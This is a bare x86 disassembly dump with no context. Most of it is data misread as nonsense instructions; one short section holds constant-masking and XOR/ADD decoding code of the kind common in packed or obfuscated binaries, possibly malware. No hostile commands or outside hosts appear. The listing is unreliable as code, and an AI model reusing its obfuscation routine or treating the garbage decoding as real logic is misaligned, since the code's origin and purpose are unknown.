  41fc9e:	mov    DWORD PTR [edx-0x15768425],eax
  41fca4:	cwde   
  41fca5:	dec    ecx
  41fca6:	add    al,0x7e
  41fca8:	daa    
  41fca9:	mov    cl,0x92
  41fcab:	cli    
  41fcac:	or     al,0x9f
  41fcae:	push   DWORD PTR [edx]
  41fcb0:	xchg   DWORD PTR [ebp-0x11],ebx
  41fcb3:	lock push ecx
  41fcb5:	mov    ebx,0x902ad08c
  41fcba:	add    eax,esi
  41fcbc:	fnsave [ecx]
  41fcbe:	(bad)  
  41fcbf:	pushf  
  41fcc0:	fsub   DWORD PTR [ebx+0x17]
  41fcc3:	iret   
  41fcc4:	push   es
  41fcc5:	addr16 xchg ebp,eax
  41fcc7:	push   eax
  41fcc8:	jnp    0x41fd44
  41fcca:	pop    edi
  41fccb:	lds    ebx,FWORD PTR [ecx+0x61330a9f]
  41fcd1:	out    0x6b,eax
  41fcd3:	in     eax,dx
  41fcd4:	or     edi,ecx
  41fcd6:	dec    ecx
  41fcd7:	pop    esi
  41fcd8:	push   es
  41fcd9:	test   al,0x41
  41fcdb:	pushf  
  41fcdc:	int3   
  41fcdd:	or     al,0x57
  41fcdf:	fwait
  41fce0:	mov    esi,0x863417b3
  41fce5:	dec    esp
  41fce6:	or     al,0xc4
  41fce8:	loop   0x41fd1e
  41fcea:	mov    ebp,0xbd3d2f5
  41fcef:	and    al,dh
  41fcf1:	scas   al,BYTE PTR es:[edi]
  41fcf2:	xor    al,0x75
  41fcf4:	sub    eax,0x6a13a3bd
  41fcf9:	mov    dl,0x8e
  41fcfb:	aam    0x7a
  41fcfd:	arpl   bp,di
  41fcff:	adc    esp,ecx
  41fd01:	jmp    0x41fd4d
  41fd03:	add    eax,0x58bd2f96
  41fd08:	dec    ecx
  41fd09:	lahf   
  41fd0a:	lods   al,BYTE PTR ds:[esi]
  41fd0b:	loopne 0x41fd05
  41fd0d:	push   ds
  41fd0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd0f:	mov    al,ds:0x51c60418
  41fd14:	and    dl,BYTE PTR [edx-0x248979eb]
  41fd1a:	jl     0x41fcf7
  41fd1c:	sbb    BYTE PTR [edx-0x79a56e0c],ch
  41fd22:	xor    al,0x7
  41fd24:	addr16 fscale 
  41fd27:	pop    ebx
  41fd28:	xchg   esi,eax
  41fd29:	push   0xffffffd5
  41fd2b:	js     0x41fd47
  41fd2d:	fwait
  41fd2e:	pushw  ss
  41fd30:	or     BYTE PTR ds:0x1a39f3c7,ch
  41fd36:	sbb    al,0x62
  41fd38:	and    BYTE PTR [eax],0xf8
  41fd3b:	test   DWORD PTR [esi-0x53],ecx
  41fd3e:	stos   DWORD PTR es:[edi],eax
  41fd3f:	add    bh,BYTE PTR [ecx-0x74ff7d8]
  41fd45:	sti    
  41fd46:	sbb    eax,DWORD PTR [ebp-0x21abbab4]
  41fd4c:	fld    QWORD PTR [esi+0x47db6088]
  41fd52:	aam    0x92
  41fd54:	aaa    
  41fd55:	(bad)  
  41fd57:	jbe    0x41fdc1
  41fd59:	jo     0x41fd08
  41fd5b:	jp     0x41fd70
  41fd5d:	xchg   esi,eax
  41fd5e:	data16 lahf 
  41fd60:	rcr    BYTE PTR [eax+0x3ab9d75b],0xdd
  41fd67:	and    dl,BYTE PTR [esi]
  41fd69:	adc    al,BYTE PTR [esi]
  41fd6b:	or     al,0xfa
  41fd6d:	cmp    al,BYTE PTR [esi+0x6a03cd46]
  41fd73:	cdq    
  41fd74:	pop    ecx
  41fd75:	mov    DWORD PTR [edx-0x73],edi
  41fd78:	test   BYTE PTR [ebx],dh
  41fd7a:	imul   ebx,edx,0xffffff8a
  41fd7d:	std    
  41fd7e:	mov    ch,0x7a
  41fd80:	loopne 0x41fd71
  41fd82:	mov    ds:0xd32fab5e,eax
  41fd87:	sahf   
  41fd88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd89:	push   ss
  41fd8a:	or     dh,BYTE PTR [edi+0x72]
  41fd8d:	jo     0x41fddf
  41fd8f:	das    
  41fd90:	sub    bh,ch
  41fd92:	xchg   ecx,eax
  41fd93:	push   ds
  41fd94:	add    al,0x8d
  41fd96:	sbb    ch,BYTE PTR [esp+ebp*4+0xd]
  41fd9a:	into   
  41fd9b:	and    BYTE PTR [ecx+0x1a650a93],dh
  41fda1:	mov    edi,0xcb96040a
  41fda6:	sub    DWORD PTR [esp+ebp*2],edi
  41fda9:	xchg   ebx,eax
  41fdaa:	lea    esi,[ebp-0x7a5856cf]
  41fdb0:	sub    dh,bl
  41fdb2:	sbb    al,0x75
  41fdb4:	jae    0x41fd68
  41fdb6:	cmp    dh,BYTE PTR [esi-0x64]
  41fdb9:	out    dx,eax
  41fdba:	or     DWORD PTR [esi+0x32a07d3c],esi
  41fdc0:	add    al,0xd6
  41fdc2:	out    dx,eax
  41fdc3:	cli    
  41fdc4:	fsubr  st,st(4)
  41fdc6:	xor    DWORD PTR [eax],esi
  41fdc8:	stos   BYTE PTR es:[edi],al
  41fdc9:	mov    al,0xaf
  41fdcb:	jge    0x41fe1c
  41fdcd:	or     ah,bl
  41fdcf:	jae    0x41fdb8
  41fdd1:	sub    BYTE PTR [esi-0x2b],bh
  41fdd4:	pop    ebx
  41fdd5:	lock sti 
  41fdd7:	fnstenv [ebp-0x5c]
  41fdda:	push   es
  41fddb:	nop
  41fddc:	jle    0x41fdd8
  41fdde:	xchg   edx,eax
  41fddf:	inc    eax
  41fde0:	cli    
  41fde1:	int3   
  41fde2:	and    DWORD PTR [ebx-0x49],edx
  41fde5:	aaa    
  41fde6:	das    
  41fde7:	mov    ch,0xcf
  41fde9:	cdq    
  41fdea:	dec    ebx
  41fdeb:	mov    ecx,0x13a673ef
  41fdf0:	xchg   BYTE PTR [esi+0x20],bl
  41fdf3:	push   cs
  41fdf4:	imul   ecx,DWORD PTR [esi],0x8ab225ac
  41fdfa:	cmp    BYTE PTR [edx*1-0x3e365b25],0xad
  41fe02:	ds pop ecx
  41fe04:	mov    BYTE PTR [ebx-0x603ded94],dl
  41fe0a:	shl    DWORD PTR [edx-0x44],1
  41fe0d:	jne    0x41fe4b
  41fe0f:	adc    BYTE PTR [edi],0xae
  41fe12:	dec    eax
  41fe13:	in     eax,0x72
  41fe15:	adc    BYTE PTR [ebp-0x5de2cfc7],bh
  41fe1b:	push   ebx
  41fe1c:	dec    esp
  41fe1d:	cmc    
  41fe1e:	gs adc eax,0x86a169e
  41fe24:	cmp    esp,ebx
  41fe26:	cmp    eax,0x878edba6
  41fe2b:	cmp    al,0x9f
  41fe2d:	arpl   WORD PTR [ecx],bx
  41fe2f:	call   DWORD PTR [ebx-0xc]
  41fe32:	inc    edx
  41fe33:	xchg   ebx,eax
  41fe34:	mov    bh,0xd1
  41fe36:	xor    esp,DWORD PTR [ecx-0x5ad78daf]
  41fe3c:	and    eax,0x818b5ee9
  41fe41:	dec    DWORD PTR [ecx+0x21]
  41fe44:	data16 sar BYTE PTR [ebx*2+0x2d60e9eb],1
  41fe4c:	imul   DWORD PTR [ebp-0x5cb89272]
  41fe52:	adc    eax,0x578d7be6
  41fe58:	mov    dl,0x60
  41fe5a:	jg     0x41fe94
  41fe5c:	mov    eax,ds:0x3f2e79e
  41fe61:	or     ah,BYTE PTR [eax-0x17]
  41fe64:	js     0x41fe75
  41fe66:	jno    0x41fe39
  41fe68:	push   ds
  41fe69:	xor    al,0x6f
  41fe6b:	cld    
  41fe6c:	mov    ebp,DWORD PTR [ecx-0x15]
  41fe6f:	pop    es
  41fe70:	popf   
  41fe71:	cmp    BYTE PTR [eax+0x331b3f14],ch
  41fe77:	mov    eax,DWORD PTR [edi]
  41fe79:	cmp    ebp,DWORD PTR [ebx]
  41fe7b:	cli    
  41fe7c:	push   0x85652628
  41fe81:	das    
  41fe82:	test   eax,0x2d38ea7c
  41fe87:	aas    
  41fe88:	sub    ebp,edi
  41fe8a:	push   edx
  41fe8b:	int    0x46
  41fe8d:	out    0x29,al
  41fe8f:	push   ebp
  41fe90:	xor    al,0xd8
  41fe92:	jmp    0xaaf3:0xaac6be57
  41fe99:	mov    BYTE PTR [ecx+0x27],ah
  41fe9c:	test   al,0x53
  41fe9e:	pop    ss
  41fe9f:	dec    edi
  41fea0:	cwde   
  41fea1:	mov    BYTE PTR [esi],ch
  41fea3:	cmc    
  41fea4:	shr    BYTE PTR ds:0xc4253a85,cl
  41feaa:	adc    bl,ch
  41feac:	test   eax,0x16252ba1
  41feb1:	pop    eax
  41feb2:	test   al,0xc5
  41feb4:	push   es
  41feb5:	inc    esi
  41feb6:	shl    bh,0x3e
  41feb9:	add    al,0xc8
  41febb:	jbe    0x41fe5a
  41febd:	mov    dh,0x4e
  41febf:	and    eax,ebp
  41fec1:	jne    0x41ff02
  41fec3:	sbb    eax,0xcc44190e
  41fec8:	sahf   
  41fec9:	xlat   BYTE PTR ds:[ebx]
  41feca:	mov    dl,0x4e
  41fecc:	in     eax,dx
  41fecd:	outs   dx,BYTE PTR ds:[esi]
  41fece:	dec    eax
  41fecf:	or     DWORD PTR [ebp+0x20],0x98d1236d
  41fed6:	dec    esp
  41fed7:	xchg   ecx,eax
  41fed8:	arpl   si,bx
  41feda:	cwde   
  41fedb:	push   edx
  41fedc:	cmp    dh,BYTE PTR [ecx]
  41fede:	(bad)  
  41fedf:	lods   eax,DWORD PTR ds:[esi]
  41fee0:	cmp    bh,BYTE PTR [esi+0x71]
  41fee3:	xchg   ebp,eax
  41fee4:	sub    bl,al
  41fee6:	(bad)  
  41fee7:	sti    
  41fee8:	imul   eax,DWORD PTR [eax+0x58],0x37
  41feec:	jg     0x41fecc
  41feee:	outs   dx,BYTE PTR ds:[esi]
  41feef:	adc    ah,BYTE PTR [ebx+0x57132792]
  41fef5:	xchg   ebx,eax
  41fef6:	aas    
  41fef7:	mov    dh,0x25
  41fef9:	fwait
  41fefa:	pop    ebp
  41fefb:	xor    DWORD PTR ss:[edx],esp
  41fefe:	xor    al,dl
  41ff00:	inc    ecx
  41ff01:	aam    0x4d
  41ff03:	jo     0x41fec8
  41ff05:	sub    al,0xe7
  41ff07:	pop    ecx
  41ff08:	jo     0x41fee7
  41ff0a:	cmp    eax,0x6f537bb9
  41ff0f:	aam    0x34
  41ff11:	mov    esp,0x77fae04
  41ff16:	int    0xb9
  41ff18:	sub    al,0xd4
  41ff1a:	mov    bh,BYTE PTR [edi]
  41ff1c:	cli    
  41ff1d:	(bad)  
  41ff1e:	xchg   edi,eax
  41ff1f:	xor    ecx,ebp
  41ff21:	or     DWORD PTR [edx],ebx
  41ff23:	jno    0x41ff64
  41ff25:	pop    esi
  41ff26:	aaa    
  41ff27:	mov    ebx,DWORD PTR [ecx+0x62]
  41ff2a:	and    eax,0x5283c9fe
  41ff2f:	inc    ebx
  41ff30:	scas   al,BYTE PTR es:[edi]
  41ff31:	ja     0x41ff4e
  41ff33:	sub    DWORD PTR [ebp-0x22],ebp
  41ff36:	retf   0xef17
  41ff39:	push   0x7b5ea196
  41ff3e:	fidiv  WORD PTR ds:0x246f531b
  41ff44:	push   eax
  41ff45:	jb     0x41ff13
  41ff47:	(bad)  
  41ff48:	jae    0x41ff7e
  41ff4a:	push   eax
  41ff4b:	and    dh,BYTE PTR [ecx+0x2f]
  41ff4e:	sbb    al,0xf0
  41ff50:	int    0xa5
  41ff52:	and    ah,BYTE PTR ds:0x8edd0417
  41ff58:	sti    
  41ff59:	cmp    BYTE PTR [eax+0x78f2d38],cl
  41ff5f:	popa   
  41ff60:	ret    0xed0f
  41ff63:	add    DWORD PTR [edi+ecx*2],ebp
  41ff66:	stos   DWORD PTR es:[edi],eax
  41ff67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff68:	scas   al,BYTE PTR es:[edi]
  41ff69:	xchg   edx,eax
  41ff6a:	stc    
  41ff6b:	ret    0x18d9
  41ff6e:	outs   dx,BYTE PTR ds:[esi]
  41ff6f:	mov    esp,DWORD PTR [ecx+0x1485f24e]
  41ff75:	mov    cl,0xb1
  41ff77:	nop
  41ff78:	add    dl,bh
  41ff7a:	push   0xeb0d880f
  41ff7f:	jl     0x41ffe1
  41ff81:	(bad)  
  41ff82:	ja     0x41ffb7
  41ff84:	sub    al,0xf
  41ff86:	fs push esi
  41ff88:	sub    edi,edx
  41ff8a:	stos   DWORD PTR es:[edi],eax
  41ff8b:	loopne 0x41ff7f
  41ff8d:	mov    dl,0xc3
  41ff8f:	out    0xed,eax
  41ff91:	sub    al,0x22
  41ff93:	fimul  DWORD PTR [edi+0x526d251c]
  41ff99:	jmp    0x79035507
  41ff9e:	repz dec esi
  41ffa0:	inc    ebx
  41ffa1:	mov    edi,0x624f1e3f
  41ffa6:	or     dh,ah
  41ffa8:	mov    esi,0x87892593
  41ffad:	fdiv   DWORD PTR [ebx]
  41ffaf:	add    al,0x3d
  41ffb1:	shl    BYTE PTR [ebp-0x1c4dfcb0],0x2f
  41ffb8:	mov    esp,0xb5fecf06
  41ffbd:	test   BYTE PTR [eax+0x347cece8],0xc0
  41ffc4:	cs pop esp
  41ffc6:	xor    DWORD PTR [ecx-0x50],edi
  41ffc9:	nop
  41ffca:	pushf  
  41ffcb:	and    al,0x40
  41ffcd:	sbb    esi,DWORD PTR [ecx+0x17]
  41ffd0:	adc    ch,al
  41ffd2:	int    0x48
  41ffd4:	popf   
  41ffd5:	scas   al,BYTE PTR es:[edi]
  41ffd6:	in     al,0x85
  41ffd8:	mov    ebp,0xf8a7e188
  41ffdd:	test   al,0xc7
  41ffdf:	call   0xce61:0x44467eaf
  41ffe6:	jg     0x41fffd
  41ffe8:	ins    BYTE PTR es:[edi],dx
  41ffe9:	loopne 0x41ffbe
  41ffeb:	add    eax,0xb2036772
  41fff0:	sbb    ebp,eax
  41fff2:	push   edx
  41fff3:	lock pop edx
  41fff5:	mov    ds,WORD PTR [ebx-0xd]
  41fff8:	mov    ds:0xe84d8b4a,al
  41fffd:	sub    eax,ecx
  41ffff:	mov    DWORD PTR [ebp-0x18],eax
  420002:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  420009:	mov    eax,DWORD PTR [ebp-0xc]
  42000c:	mov    ecx,DWORD PTR [ebp-0xc]
  42000f:	sub    eax,ecx
  420011:	mov    DWORD PTR [ebp-0xc],eax
  420014:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42001b:	mov    eax,DWORD PTR [ebp-0x1c]
  42001e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420021:	sub    eax,ecx
  420023:	mov    DWORD PTR [ebp-0x1c],eax
  420026:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  42002d:	mov    eax,DWORD PTR [ebp-0x20]
  420030:	mov    ecx,DWORD PTR [ebp-0x20]
  420033:	sub    eax,ecx
  420035:	mov    DWORD PTR [ebp-0x20],eax
  420038:	mov    eax,DWORD PTR [ebp-0x2c]
  42003b:	mov    ecx,DWORD PTR [ebp-0x20]
  42003e:	mov    esi,0x75108ae
  420043:	xor    eax,esi
  420045:	mov    edi,0x3272f5
  42004a:	add    eax,edi
  42004c:	or     eax,ecx
  42004e:	mov    DWORD PTR [ebp-0x20],eax
  420051:	mov    eax,DWORD PTR [ebp-0x4]
  420054:	mov    ecx,DWORD PTR [ebp-0x4]
  420057:	sub    eax,ecx
  420059:	mov    DWORD PTR [ebp-0x4],eax
  42005c:	or     DWORD PTR [ebp-0x4],0xf89c85be
  420063:	mov    eax,DWORD PTR [ebp-0xc]
  420066:	xor    eax,esi
  420068:	add    eax,edi
  42006a:	push   eax
  42006b:	mov    eax,DWORD PTR [ebp-0x10]
  42006e:	xor    eax,esi
  420070:	add    eax,edi
  420072:	push   eax
  420073:	mov    eax,DWORD PTR [ebp-0x4]
  420076:	xor    eax,esi
  420078:	add    eax,edi
  42007a:	push   eax
  42007b:	lea    eax,[ebp-0x78]
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp-0x2c]
  420082:	push   DWORD PTR [ebp-0x28]
  420085:	call   0x40f76f
  42008a:	test   eax,eax
  42008c:	je     0x4200ba
  420092:	lea    eax,[ebp-0x78]
  420095:	push   eax
  420096:	mov    eax,DWORD PTR [ebp-0x28]
  420099:	xor    eax,esi
  42009b:	add    eax,edi
  42009d:	push   eax
  42009e:	mov    eax,DWORD PTR [ebp-0x24]
  4200a1:	add    eax,0xaa
  4200a6:	push   eax
  4200a7:	mov    eax,DWORD PTR [ebp-0x24]
  4200aa:	mov    eax,DWORD PTR [eax+0x198]
  4200b0:	push   DWORD PTR [eax]
  4200b2:	call   0x4061fa
  4200b7:	mov    DWORD PTR [ebp-0x14],eax
  4200ba:	mov    ecx,DWORD PTR ds:0x42a56a
  4200c0:	lea    eax,[ebp+0x4]
  4200c3:	mov    DWORD PTR [ecx*4+0x42a562],eax
  4200ca:	inc    DWORD PTR ds:0x42a56a
  4200d0:	mov    eax,DWORD PTR [ebp-0x14]
  4200d3:	test   eax,eax
  4200d5:	je     0x4224ce
  4200db:	lea    eax,[ebp-0x8]
  4200de:	mov    DWORD PTR [ebp-0x34],eax
  4200e1:	mov    eax,DWORD PTR [ebp-0x30]
  4200e4:	mov    DWORD PTR [ebp-0x8],eax
  4200e7:	mov    eax,DWORD PTR [ebp-0x8]
  4200ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4200ed:	sub    eax,ecx
  4200ef:	mov    DWORD PTR [ebp-0x8],eax
  4200f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4200f5:	xor    ecx,esi
  4200f7:	mov    eax,0xffcd8d0b
  4200fc:	sub    eax,ecx
  4200fe:	add    DWORD PTR [ebp-0x8],eax
  420101:	mov    eax,DWORD PTR [ebp-0x8]
  420104:	mov    ecx,DWORD PTR [ebp-0x14]
  420107:	mov    DWORD PTR [ecx+0x1],eax
  42010a:	mov    eax,DWORD PTR [ebp-0x14]
  42010d:	jmp    0x42249e
  420112:	adc    ebp,DWORD PTR [ebx]
  420114:	inc    BYTE PTR [eax-0x2a]
  420117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420118:	xchg   ecx,eax
  420119:	or     dh,bh
  42011b:	lahf   
  42011c:	cmp    eax,0x24415d0a
  420121:	add    al,0x6
  420123:	mov    dh,0x80
  420125:	or     DWORD PTR [edi],0x5e
  420128:	add    DWORD PTR [ebx-0x5bf720a8],0x54
  42012f:	xchg   ebx,esi
  420131:	mov    eax,0xc112eafe
  420136:	mov    ecx,cs
  420138:	push   eax
  420139:	pop    edx
  42013a:	js     0x4200e3
  42013c:	gs (bad) 
  42013e:	fldenv [ecx+0x5f]
  420141:	cmp    DWORD PTR [ebp-0x63],ecx
  420144:	pop    ecx
  420145:	adc    BYTE PTR [edi],0xe2
  420148:	mov    WORD PTR ds:[esi+edi*2-0x45],?
  42014d:	inc    eax
  42014e:	sahf   
  42014f:	into   
  420150:	and    BYTE PTR [ecx-0x60],cl
  420153:	mov    ds:0xd906108b,al
  420158:	add    edx,DWORD PTR [eax]
  42015a:	call   0x3e08:0x5b5f3acf
  420161:	or     BYTE PTR [esi],ch
  420163:	xchg   ebx,eax
  420164:	mov    eax,ds:0xbb5ea7d0
  420169:	add    eax,0xd6ccf927
  42016e:	in     al,0x6f
  420170:	hlt    
  420171:	shl    eax,cl
  420173:	shl    esp,1
  420175:	aaa    
  420176:	mov    dl,0xde
  420178:	adc    eax,0x641778cf
  42017d:	fs xchg ebp,eax
  42017f:	test   BYTE PTR [edx-0x4edb8e4a],ch
  420185:	cmp    al,0xe9
  420187:	dec    ebp
  420188:	(bad)  
  420189:	and    ecx,DWORD PTR [esi]
  42018b:	retf   0x7ab8
  42018e:	push   ebp
  42018f:	lea    edx,[ecx]
  420191:	or     al,0xf5
  420193:	(bad)  
  420194:	neg    bh
  420196:	push   ds
  420197:	dec    ebx
  420198:	mov    esp,0x25dadeda
  42019d:	je     0x42014c
  42019f:	jmp    0xfd01:0xbe423655
  4201a6:	pop    ecx
  4201a7:	rcl    DWORD PTR [esi-0x5f],cl
  4201aa:	pop    ebp
  4201ab:	add    BYTE PTR [edi+eax*8],0x31
  4201af:	or     ah,BYTE PTR [edi-0x66f8e2c8]
  4201b5:	mov    ch,0xed
  4201b7:	(bad)  
  4201b8:	inc    edi
  4201b9:	push   cs
  4201ba:	push   esi
  4201bb:	adc    ecx,DWORD PTR [ecx-0x59]
  4201be:	aaa    
  4201bf:	(bad)  
  4201c0:	lock dec edi
  4201c2:	adc    DWORD PTR [ebx],0x46
  4201c5:	loop   0x42014e
  4201c7:	and    ah,BYTE PTR ds:0x8986e3bb
  4201cd:	mov    bh,0x10
  4201cf:	jmp    0x420178
  4201d1:	pop    edx
  4201d2:	pop    es
  4201d3:	lea    esp,[ecx-0x16466689]
  4201d9:	push   edx
  4201da:	jae    0x420218
  4201dc:	inc    eax
  4201dd:	int3   
  4201de:	test   DWORD PTR [edi],0x913f25a3
  4201e4:	mov    edx,0x9ffe50b
  4201e9:	gs pusha 
  4201eb:	fs xchg edi,eax
  4201ed:	jo     0x42018b
  4201ef:	push   ds
  4201f0:	cmp    al,0x92
  4201f2:	push   cs
  4201f3:	mov    ebp,DWORD PTR [ebx+0x73]
  4201f6:	mov    edi,0xdc8ee75a
  4201fb:	mov    ch,0xc8
  4201fd:	scas   eax,DWORD PTR es:[edi]
  4201fe:	pop    ecx
  4201ff:	fwait
  420200:	xchg   esp,eax
  420201:	xchg   dl,ah
  420203:	(bad)  
  420204:	jmp    0x42022c
  420206:	mov    ah,0xf2
  420208:	push   esi
  420209:	push   0x1e
  42020b:	push   ss
  42020c:	jno    0x4201ad
  42020e:	jmp    0x420244
  420210:	repnz push ss
  420212:	mov    edx,0x24b1b8d9
  420217:	fucomp st(2)
  420219:	push   edi
  42021a:	int    0x4
  42021c:	or     al,al
  42021e:	fwait
  42021f:	scas   eax,DWORD PTR es:[edi]
  420220:	xchg   DWORD PTR [edi-0x75d5d925],esp
  420226:	popf   
  420227:	dec    eax
  420228:	fs dec ecx
  42022a:	add    eax,0xa700feb9
  42022f:	and    dl,BYTE PTR [edi+0x6f222367]
  420235:	adc    eax,0x816645de
  42023a:	xor    DWORD PTR [edi],0xffffffb3
  42023d:	dec    edx
  42023e:	pop    ecx
  42023f:	inc    esp
  420240:	out    0xae,al
  420242:	cdq    
  420243:	dec    ebp
  420244:	mov    DWORD PTR [edi],edi
  420246:	das    
  420247:	xlat   BYTE PTR ds:[ebx]
  420248:	cmp    DWORD PTR [ecx],esi
  42024a:	in     eax,0x92
  42024c:	or     ebx,eax
  42024e:	pusha  
  42024f:	loope  0x420205
  420251:	pop    ebp
  420252:	cmc    
  420253:	cs dec esi
  420255:	inc    ebp
  420256:	xchg   edi,eax
  420257:	pusha  
  420258:	xchg   esp,eax
  420259:	lods   al,BYTE PTR ds:[esi]
  42025a:	dec    ebx
  42025b:	add    eax,0x77ece110
  420260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420261:	sbb    DWORD PTR [ebp-0x139d2fd4],0x3bf53838
  42026b:	fsubr  DWORD PTR [ebx]
  42026d:	mov    ds:0x6d96aa4a,eax
  420272:	cdq    
  420273:	addr16 or eax,0xc7c3e2fd
  420279:	retf   
  42027a:	setge  BYTE PTR [esi+0x738c23b7]
  420281:	(bad)  
  420282:	hlt    
  420283:	fnstsw WORD PTR [esi+0x64]
  420286:	aam    0x31
  420288:	dec    eax
  420289:	add    BYTE PTR [eax+0x2fd1dc58],bl
  42028f:	retf   
  420290:	enter  0x10b2,0x4f
  420294:	lea    esi,[ebp+edi*1+0x33]
  420298:	cmp    esi,edx
  42029a:	stos   DWORD PTR es:[edi],eax
  42029b:	in     eax,dx
  42029c:	test   DWORD PTR [edi+ebx*2+0x1d],0xaca2d3c9
  4202a4:	sbb    eax,0x8ccd61c3
  4202a9:	dec    eax
  4202aa:	sbb    al,0x33
  4202ac:	pop    eax
  4202ad:	inc    eax
  4202ae:	jns    0x4202f1
  4202b0:	mov    ch,0xe8
  4202b2:	push   esi
  4202b3:	mov    al,ds:0xe2b7826e
  4202b8:	aas    
  4202b9:	(bad)
  4202bd:	mov    bh,0x4a
  4202bf:	lock xor DWORD PTR [edx+0x52702d36],0xa910906f
  4202ca:	sbb    BYTE PTR [ecx-0x57],ah
  4202cd:	fcmove st,st(0)
  4202cf:	fsubr  QWORD PTR [edi+0x3d4c95c6]
  4202d5:	data16 jg 0x420336
  4202d8:	not    DWORD PTR [edi-0x21e4dd40]
  4202de:	cli    
  4202df:	xchg   edx,eax
  4202e0:	xchg   ebx,eax
  4202e1:	and    cl,al
  4202e3:	outs   dx,BYTE PTR ds:[esi]
  4202e4:	and    eax,0xcc6e2b5
  4202e9:	push   ds
  4202ea:	or     BYTE PTR [ebp-0xc],al
  4202ed:	pushf  
  4202ee:	add    eax,0x95be7487
  4202f3:	fstp   TBYTE PTR [ebx]
  4202f5:	jle    0x420369
  4202f7:	push   esi
  4202f8:	sbb    al,0xc5
  4202fa:	inc    ebx
  4202fb:	xor    cl,bl
  4202fd:	ret    
  4202fe:	push   es
  4202ff:	mov    ecx,0xc95705f2
  420304:	sub    DWORD PTR [edi+esi*8-0x78b6b711],ebx
  42030b:	or     dh,BYTE PTR [ecx]
  42030d:	jp     0x420316
  42030f:	add    DWORD PTR [ebp+esi*2-0x1e],ebp
  420313:	or     esp,edx
  420315:	jmp    0x45e6:0x4e1c87c5
  42031c:	jno    0x420365
  42031e:	test   cl,cl
  420320:	iret   
  420321:	pop    ecx
  420322:	jnp    0x4202d6
  420324:	inc    eax
  420325:	out    dx,eax
  420326:	in     al,0x6c
  420328:	or     al,0x5f
  42032a:	sub    BYTE PTR [ebx-0x605fb926],ch
  420330:	push   ss
  420331:	sub    ecx,DWORD PTR [eax*4-0x657646dd]
  420338:	jno    0x420315
  42033a:	jmp    0xd458:0xfc0edf53
  420341:	push   cs
  420342:	xor    BYTE PTR [ebx+edi*4],cl
  420345:	mov    DWORD PTR [esi-0x5c8bdb35],ebx
  42034b:	cli    
  42034c:	stos   BYTE PTR es:[edi],al
  42034d:	cmp    DWORD PTR [bp+0x13],0xffcb596d
  420355:	scas   eax,DWORD PTR es:[edi]
  420356:	push   ebx
  420357:	push   ebp
  420358:	leave  
  420359:	sbb    eax,ebx
  42035b:	popa   
  42035c:	sbb    eax,0x2319d2df
  420361:	jmp    0x420314
  420363:	xchg   esi,eax
  420364:	mov    dh,0x7
  420366:	push   ecx
  420367:	rol    esp,1
  420369:	pop    edx
  42036a:	push   ebp
  42036b:	dec    esp
  42036c:	inc    eax
  42036d:	pop    esp
  42036e:	xchg   edi,eax
  42036f:	xor    cl,BYTE PTR [ebp+0x300a46dd]
  420375:	xor    DWORD PTR [edi+0x6e],0x4e3b35d3
  42037c:	pop    esp
  42037d:	dec    ebp
  42037e:	inc    esp
  42037f:	jno    0x4203b7
  420381:	xchg   esi,eax
  420382:	loopne 0x42032b
  420384:	xchg   esp,eax
  420385:	cdq    
  420386:	retf   0x494e
  420389:	outs   dx,DWORD PTR ds:[esi]
  42038a:	fidivr DWORD PTR [edx+0x4164380]
  420390:	inc    ecx
  420391:	mov    esp,DWORD PTR [eax+0x7698bf43]
  420397:	xchg   edx,eax
  420398:	fisttp QWORD PTR [esi+0x7a]
  42039b:	pop    ebx
  42039c:	out    0x3a,al
  42039e:	mov    esp,0x557e80c8
  4203a3:	mov    edx,0xf9699ff
  4203a8:	fwait
  4203a9:	inc    ebx
  4203aa:	adc    DWORD PTR [esi],ebp
  4203ac:	or     edx,DWORD PTR [ebp+0x49]
  4203af:	gs mov ch,0x68
  4203b2:	or     ecx,DWORD PTR [ebx-0x65]
  4203b5:	icebp  
  4203b6:	mov    ah,0xe2
  4203b8:	clc    
  4203b9:	aad    0x9b
  4203bb:	inc    eax
  4203bc:	mov    esi,0x2216ae39
  4203c1:	pop    edx
  4203c2:	add    al,BYTE PTR [edx]
  4203c4:	pop    edi
  4203c5:	jne    0x420371
  4203c7:	sub    eax,0xd97c0e3a
  4203cc:	mov    al,ds:0x5ebef58d
  4203d1:	xchg   DWORD PTR [edi+ecx*8-0x28a0d388],edx
  4203d8:	(bad)  
  4203d9:	lock mov eax,DWORD PTR [eax+edx*2+0x2b582b4b]
  4203e1:	loope  0x42044f
  4203e3:	mov    eax,ds:0xa21a38b5
  4203e8:	enter  0x1e07,0xf9
  4203ec:	xlat   BYTE PTR ds:[ebx]
  4203ed:	div    DWORD PTR ds:0xda8c672b
  4203f3:	add    eax,0x179d63fb
  4203f8:	jmp    edi
  4203fa:	xchg   esp,eax
  4203fb:	stos   DWORD PTR es:[edi],eax
  4203fc:	cli    
  4203fd:	push   ebp
  4203fe:	outs   dx,DWORD PTR ds:[esi]
  4203ff:	rol    DWORD PTR [ebx-0x6bd590b9],cl
  420405:	call   0x30c9:0x5329940d
  42040c:	pop    ss
  42040d:	jno    0x420469
  42040f:	dec    ecx
  420410:	sub    dl,BYTE PTR [ebx+0x52]
  420413:	push   es
  420414:	or     ah,ah
  420416:	sbb    eax,0x389d8d30
  42041b:	and    DWORD PTR [ebx],0x619d034f
  420421:	pop    edi
  420422:	mov    BYTE PTR [edi],al
  420424:	push   edi
  420425:	or     dl,BYTE PTR [edx]
  420427:	adc    cl,BYTE PTR [edi]
  420429:	jl     0x4203ba
  42042b:	pop    esp
  42042c:	(bad)
  42042f:	daa    
  420430:	cmp    esi,DWORD PTR [ebx-0x70]
  420433:	lock jne 0x4203c8
  420436:	xor    bl,ch
  420438:	xchg   ebx,eax
  420439:	lods   eax,DWORD PTR cs:[esi]
  42043b:	xor    edx,DWORD PTR [esi-0xafe4112]
  420441:	(bad)  
  420442:	ja     0x4203df
  420444:	mov    ebp,0x7d4410b6
  420449:	sbb    dl,BYTE PTR [ebp+0x7fe31df7]
